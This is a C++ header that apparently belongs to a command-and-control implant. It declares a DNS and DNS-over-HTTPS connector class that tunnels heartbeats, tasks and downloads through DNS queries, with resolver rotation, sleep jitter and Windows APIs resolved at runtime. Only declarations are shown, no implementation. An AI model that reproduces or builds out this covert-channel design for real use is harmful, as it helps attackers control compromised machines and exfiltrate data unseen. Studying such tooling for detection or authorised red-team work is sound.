#pragma once

#include "AgentConfig.h"
#include <windows.h>
#include <wininet.h>
#include "Connector.h"

#define DECL_API(x) decltype(x) * x

struct DNSFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(WSAStartup);
	DECL_API(WSACleanup);
	DECL_API(socket);
	DECL_API(closesocket);
	DECL_API(sendto);
	DECL_API(recvfrom);
	DECL_API(select);
	DECL_API(gethostbyname);
	DECL_API(Sleep);
	DECL_API(GetTickCount);
	DECL_API(LoadLibraryA);
	DECL_API(GetLastError);
};

struct DOHFUNC {
	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

struct DohResolverInfo {
	CHAR host[256];
	CHAR path[128];
	WORD port;
};

class ConnectorDNS : public Connector
{
public:
	static const ULONG kDefaultPktSize = 100;
	static const ULONG kMaxPktSize = 120;
	static const ULONG kMaxLabelSize = 63;
	static const ULONG kDefaultLabelSize = 48;
	static const ULONG kMaxResolvers = 16;
	static const ULONG kMaxFailCount = 2;
	static const ULONG kQueryTimeout = 3;  // seconds

private:
	ProfileDNS profile = { 0 };

	CHAR  rawResolvers[512] = { 0 };
	CHAR* resolverList[kMaxResolvers] = { 0 };
	ULONG resolverCount = 0;
	ULONG currentResolverIndex = 0;
	ULONG resolverFailCount[kMaxResolvers] = { 0 };
	ULONG resolverDisabledUntil[kMaxResolvers] = { 0 };

	CHAR  sid[17] = { 0 };
	BYTE  encryptKey[16] = { 0 };
	ULONG pktSize = 0;
	ULONG labelSize = 0;
	CHAR  domain[256] = { 0 };
	CHAR  qtype[8] = { 0 };
	BOOL  initialized = FALSE;

	BOOL  hiSent = FALSE;
	BYTE* hiBeat = NULL;
	ULONG hiBeatSize = 0;
	ULONG seq = 0;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	ULONG downFilled = 0;
	ULONG downTotal = 0;
	BYTE* downBuf = NULL;
	ULONG downTaskNonce = 0;
	BOOL  hasPendingTasks = FALSE;

	ULONG sleepDelaySeconds = 0;

	ULONG lastUpTotal = 0;
	ULONG lastDownTotal = 0;
	ULONG pendingDownAck = 0;
	ULONG pendingDownNonce = 0;

	DNSFUNC* functions = NULL;

	DOHFUNC* dohFunctions = NULL;
	BOOL     dohInitialized = FALSE;
	HINTERNET hInternet = NULL;
	DohResolverInfo dohResolverList[kMaxResolvers] = { 0 };
	ULONG dohResolverCount = 0;
	ULONG currentDohResolverIndex = 0;
	ULONG dohResolverFailCount[kMaxResolvers] = { 0 };
	ULONG dohResolverDisabledUntil[kMaxResolvers] = { 0 };
	ULONG dnsMode = DNS_MODE_UDP;

	BOOL   wsaInitialized = FALSE;
	SOCKET cachedSocket = INVALID_SOCKET;

	BYTE* queryBuffer = NULL;
	BYTE* respBuffer = NULL;
	static const ULONG kQueryBufferSize = 4096;
	static const ULONG kRespBufferSize = 4096;

	BOOL  InitWSA();
	void  CleanupWSA();
	SOCKET GetSocket();
	void  ReleaseSocket(SOCKET s, BOOL forceClose);
	BOOL  InitDoH();
	void  CleanupDoH();
	void  ParseDohResolvers(const CHAR* dohResolvers);
	BOOL  QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
	BOOL  QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
	BOOL  BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen);
	BOOL  ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
	BOOL  QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
	BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
	BOOL  QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);

	void  ParseResolvers(const CHAR* resolvers);
	void  UpdateResolvers(BYTE* resolvers);
	void  UpdateSleepDelay(ULONG sleepSeconds);
	void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
	void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
	void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
	BOOL  IsBusy() const;
	const BYTE* GetResolvers() const { return profile.resolvers; }

	BOOL  SendQuery(const CHAR* op, BYTE* data, ULONG dataSize);
	BOOL  SendQueryTXT(const CHAR* op, BYTE* data, ULONG dataSize, BYTE* respOut, ULONG respOutSize, ULONG* respSizeOut);
	BOOL  SendQueryWithResp(const CHAR* op, BYTE* data, ULONG dataSize, BYTE* respOut, ULONG respOutSize, ULONG* respSizeOut);
	void  FinalizeDownload();

public:
	ConnectorDNS();
	~ConnectorDNS();

	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs) override;
	void CloseConnector() override;

	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};
